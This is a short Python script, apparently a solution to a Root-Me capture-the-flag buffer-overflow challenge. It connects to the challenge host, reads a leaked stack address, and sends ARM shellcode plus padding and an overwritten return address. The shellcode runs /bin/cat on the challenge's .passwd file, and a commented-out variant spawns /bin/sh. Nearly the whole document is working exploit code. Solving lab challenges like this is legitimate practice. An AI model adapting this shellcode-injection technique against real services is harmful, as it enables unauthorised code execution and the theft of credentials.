## BOF Socket
#!/usr/bin/env python3

import socket
import struct
import time


#shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'

offset = 168 - 4 - len(shellcode) # 4 = longueur de l'address retour
print("[*]offset= {}".format(offset))

#connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenge04.root-me.org', 61045))
print(s.recv(1024).decode())
time.sleep(1)

#addresse de la variable
s.send(b'A\n')
rep = s.recv(4096)
return_addr = rep.decode().split(":")[0]
return_addr = struct.pack('I', int( return_addr , 16))
print("[*] return_addr = {}\n".format(return_addr))

s.send(b'y\n')
print(s.recv(1024).decode())

Payload = shellcode + b'A'*offset + return_addr + b'\n'
print("[*] Envoi de {}".format(Payload))
s.send(Payload)
print(s.recv(4096).decode())

s.send(b'n\n')
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())
print(s.recv(4096).decode())


